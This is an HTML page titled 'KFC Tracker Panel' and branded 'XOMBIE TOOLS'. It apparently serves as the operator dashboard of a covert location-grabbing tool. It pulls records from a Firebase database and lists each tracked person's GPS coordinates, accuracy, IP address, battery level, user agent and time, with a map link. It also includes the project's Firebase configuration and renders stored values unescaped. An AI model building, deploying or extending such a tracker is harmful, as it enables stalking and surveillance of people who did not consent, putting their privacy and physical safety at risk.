<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>KFC Tracker Panel</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Creepster&family=Orbitron:wght@600&display=swap');

    body {
      background: radial-gradient(ellipse at top, #1b0035 0%, #000000 100%);
      color: #ffffff;
      font-family: 'Orbitron', sans-serif;
      padding: 20px;
      margin: 0;
    }

    h1 {
      color: #00ffff;
      text-align: center;
      margin-bottom: 30px;
      text-shadow: 0 0 10px #0ff, 0 0 20px #00f;
    }

    .entry {
      background: rgba(25, 0, 50, 0.7);
      border: 2px solid #9e00ff;
      box-shadow: 0 0 15px #9e00ff, 0 0 30px #00ffff;
      padding: 20px;
      border-radius: 20px;
      margin-bottom: 30px;
      position: relative;
      transition: transform 0.3s, box-shadow 0.3s;
    }

    .entry:hover {
      transform: scale(1.03);
      box-shadow: 0 0 30px #00ffff, 0 0 50px #9e00ff;
    }

    .label {
      font-weight: bold;
      color: #ff00c8;
      text-shadow: 0 0 5px #f0f;
    }

    .entry a {
      color: #00ffff;
      text-decoration: none;
    }

    .entry a:hover {
      text-decoration: underline;
    }

    .footer {
      margin-top: 15px;
      font-size: 14px;
      font-family: 'Creepster', cursive;
      color: #ff0055;
      text-shadow: 0 0 5px red;
      display: flex;
      justify-content: flex-end;
      align-items: center;
    }

    .footer::before {
      content: "☣️ Powered by XOMBIE TOOLS ☠️";
    }
  </style>
</head>
<body>
  <h1>🔥 Live Location Panel 🔥</h1>
  <div id="locationPanel">Loading...</div>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCG7XY_KjzJkfLWtUSgarDLritenEbbvSY",
      authDomain: "kfc-tracker.firebaseapp.com",
      databaseURL: "https://kfc-tracker-default-rtdb.firebaseio.com",
      projectId: "kfc-tracker",
      storageBucket: "kfc-tracker.appspot.com",
      messagingSenderId: "127099679000",
      appId: "1:127099679000:web:4a4f5e66a5b99c63882e6d",
      measurementId: "G-EPEXKK3S37"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const panel = document.getElementById("locationPanel");

    db.ref("locations").on("value", (snapshot) => {
      const data = snapshot.val();
      panel.innerHTML = "";

      if (data) {
        const entries = Object.values(data).reverse();

        entries.forEach((entry, i) => {
          const lat = entry.latitude || "N/A";
          const lon = entry.longitude || "N/A";
          const accuracy = entry.accuracy || "N/A";
          const ip = entry.ip || "N/A";
          const battery = entry.battery || "N/A";
          const userAgent = entry.userAgent || "N/A";
          const timestamp = entry.timestamp || "N/A";
          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

          panel.innerHTML += `
            <div class="entry">
              <div class="label">#${i + 1}</div>
              🕒 <span class="label">Time:</span> ${timestamp}<br>
              📍 <span class="label">Latitude:</span> ${lat}<br>
              📍 <span class="label">Longitude:</span> ${lon}<br>
              🎯 <span class="label">Accuracy:</span> ${accuracy} m<br>
              🌐 <span class="label">IP:</span> ${ip}<br>
              🔋 <span class="label">Battery:</span> ${battery}<br>
              🧠 <span class="label">User Agent:</span> ${userAgent}<br>
              🌍 <a href="${mapsLink}" target="_blank">Open in Google Maps</a>
              <div class="footer"></div>
            </div>
          `;
        });
      } else {
        panel.innerHTML = "No data found.";
      }
    });
  </script>
</body>
</html>
